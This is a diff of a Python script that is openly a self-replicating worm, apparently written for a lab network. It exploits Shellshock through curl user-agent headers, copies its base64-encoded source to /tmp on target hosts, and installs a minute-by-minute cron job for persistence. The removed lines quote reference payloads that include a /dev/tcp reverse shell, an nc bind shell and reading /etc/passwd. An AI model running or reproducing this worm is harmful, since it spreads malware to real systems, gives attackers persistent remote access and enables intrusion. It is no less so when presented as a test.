@@ -1,18 +1,19 @@
 #!/usr/bin/env python3
 
-import os, sys # TODO: use subprocess instead of os (?)
+import os, sys, subprocess
+import base64
 from datetime import datetime
 
 # Test payload information
-payload_name = 'test_payload'
-payload_content = "print('Hello World')"
+payload_name = '/tmp/test_payload'
+payload_content = "f = open('/tmp/test_payload_exec','w')"
 
 # Worm tracking information
 def log():
 	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
 	hostinfo = os.uname()
 
-	f = open('log','x')
+	f = open('/tmp/log','x')
 	f.write(f'{timestamp}\n{hostinfo}\n')
 	f.close()
 
@@ -22,46 +23,53 @@ def copy_payload():
 		f = open(payload_name,'x') # 'x' opens for exclusive creation, failing if the file already exists
 		f.write(payload_content)
 		f.close()
+
+	# TODO: clean this up
 	except:
 		# This can potentially check if a host has been infected, but the method isn't robust
-		print(f'{payload_name} already exists!')
+		try:
+			os.mkdir('/tmp/test_already_wormed')
+		except:
+			sys.exit(0)
 		sys.exit(0)
 
 # Executes payload on host
 def execute_payload():
 	exec(open(payload_name).read())
-	#os.chmod(payload_name, 0o744) # Changes permissions to: -rwxr--r--
 	log()
 
-# Rudimentary way to make a LOCAL copy of itself when executed
-def local_replicate():
-	script = sys.argv
-	name = script[0] # type: string
-
-	os.mkdir('test')
-	os.system('cp ' + name + ' test')
-
-# Prototype for shellshock exploit via python
+# Prototype for shellshock exploit
 def exploit():
-	"""
-	# Shellshock Exploit References
+	cmd_list = []
+	targets = {'192.168.56.111': '/cgi-bin/shock.sh'} # Hardcoding this for now
 
-	https://github.com/binexisHATT/Exploits/blob/master/shellshock.py
-	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh                                                                
-		exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
-		exploit += '\'' + cmd + '\'"'
-		exploit += ' ' + url
-		subprocess.run(exploit, shell=True)
+	# Base64 encode the worm source code for easy injection
+	data = open(sys.argv[0], 'rb').read() # Change sys.argv[0]
+	encoded = base64.b64encode(data).decode()
+#	print(int(len(encoded)/2)
+	encoded_a, encoded_b = encoded[:int(len(encoded)/2)], encoded[int(len(encoded)/2):]
 
-	https://www.exploit-db.com/exploits/34900
-		headers = {"Cookie": payload, "Referer": payload}
-		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
-		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
-	"""
+	# Worm copying itself on vulnerable host
+	cmd_list.append(f'echo {encoded_a} > /tmp/.testworm')
+	cmd_list.append(f'echo {encoded_b} >> /tmp/.testworm')
+	cmd_list.append('/usr/bin/base64 -d /tmp/.testworm > /tmp/testworm.py')
+	cmd_list.append('/bin/chmod 777 /tmp/testworm.py')
 
-	targetIPs = ['127.0.0.1'] # Hardcoding this for now
-	vulnerable_path = ['/cgi-bin/admin.cgi'] # Hardcoding this for now
-	# TODO: make it work
+	# Create bash script that adds cron job to execute worm every minute
+	cmd_list.append('echo IyEvYmluL2Jhc2gKY3Jvbj0iKi8xICogKiAqICogL3Vzci9sb2NhbC9iaW4vcHl0aG9uMyAvdG1wL3Rlc3R3b3JtLnB5IgplY2hvICIkY3JvbiIgfCBjcm9udGFiIC0= > /tmp/.a')
+	cmd_list.append('/usr/bin/base64 -d /tmp/.a > /tmp/add.sh')
+	cmd_list.append('/bin/chmod 777 /tmp/add.sh')
+	cmd_list.append('/tmp/add.sh')
+
+	for IP in targets:
+		vulnerable_path = targets[IP]
+		url = f'http://{IP}{vulnerable_path}'
+
+		for cmd in cmd_list:
+			exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
+			exploit += '\'' + cmd + '\'"'
+			exploit += ' ' + url
+			subprocess.run(exploit, shell=True)
 
 def main():
 	# TODO:
@@ -74,19 +82,8 @@ def main():
 	# createpayloadarray()
 	# exploit() # worm exploits shellshock vuln, copies itself over, then executes itself
 
-
-	exploit()
-	copy_payload()
-	execute_payload()
-	local_replicate() # This will not be necessary
-	
-
-	"""
-	Making a copy of itself on vulnerable host:
-	1) Identify RCE vulnerability
-	2) Bring this script to host using RCE vulnerability (eg. echo [contents] > /tmp/worm)
-	3) Execute /tmp/worm on vulnerable host
-	4) This will propagage
-	"""
+	copy_payload() # Success if test_payload is created
+	execute_payload() # Success if test_payload_exec is created. Also creates log.txt
+	exploit() # spread
 
 main()
